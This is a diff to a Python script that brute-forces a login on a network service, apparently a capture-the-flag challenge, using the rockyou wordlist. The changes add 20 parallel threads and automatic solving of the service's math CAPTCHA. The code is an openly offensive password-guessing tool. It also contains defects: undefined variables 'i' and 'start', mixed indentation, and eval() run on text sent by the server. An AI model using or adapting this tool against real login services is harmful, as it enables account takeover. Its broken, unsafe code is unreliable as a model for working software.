@@ -27,10 +27,32 @@
 from __future__ import print_function
 import socket
 import sys
+import time
+from multiprocessing.pool import ThreadPool
 
 host = "wattsamp.net" # IP address here
 port = 1337 # Port here
 wordlist = "/usr/share/wordlists/rockyou.txt" # Point to wordlist file
+
+def recv_all(s):
+	text = ""
+	while True:
+		byte = s.recv(1)
+		#print(byte)
+		text += byte
+		if byte == "\n":
+			break
+	return text
+	
+def recv_amount(s, n):
+	data = s.recv(n)
+	i = len(data)
+	#print(data)
+	while i < n:
+		data += s.recv(n - i)
+		#print(data)
+		i = len(data)
+	return data
 
 def brute_force():
     """
@@ -69,40 +91,49 @@ def brute_force():
     
     response = "Fail"
     
-    def recv(s):
-        text = ""
-        while True:
-            byte = s.recv(1)
-            print(byte)
-            text += data
-            if byte == "\n":
-                break
-        return text
+    passwords = list(enumerate(passwords))[start:]
     
-    for i in range(1, len(passwords)):
-        password = passwords[i]
-        
+    def work(password):
+        # Connect
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
         
-        result = recv(s)
-        result = str(result).split("~~~ CAPTCHA ~~~\n")[1]
+        # Skip past intro
+        recv_amount(s, len("\n~~~ CAPTCHA ~~~\n"))
+        
+        # Get next line minimum amount
+        result = recv_amount(s, 10) # Gets line, but might be 1 or even 2 longer
+        
+        # Calculate how much more I need
+        extra = 0
+        if result[1] != " ":
+            extra += 1
+        if result[5+extra] != " ":
+            extra += 1
+        
+        # Eval and send info
         # Not safe, but I don't want to build a parser rn.
-        answer = eval(result.split("= ?")[0])
-        s.send(str(answer) + "\n")
+        answer = eval(result.split("=")[0])
+        s.sendall(str(answer) + "\n")
         
-        result = recv(s)
-        s.send(username + "\n")
+        # Throw out Username line and send username
+        recv_amount(s, extra + len("\nUsername: "))
+        s.sendall(username + "\n")
     
-        result = recv(s)
-        print("Tested " + i)
-        s.send(password + "\n")
+        # Throw out password line and send password
+        result = recv_amount(s, len("Password: "))
+        print("Tested " + str(i))
+        s.sendall(str(password) + "\n")
         
-        result = recv(s)
-        if "Fail" not in result:
-            break
+        result = s.recv(1)
+        #print(result)
+        if "F" != result:
+            print(result + recv_all(s))
+            print("It is: " + password)
+        s.close()
     
-    print("It is: " + password)
+	tp = ThreadPool(20)
+	tp.map(work, passwords)
 
 
 if __name__ == '__main__':
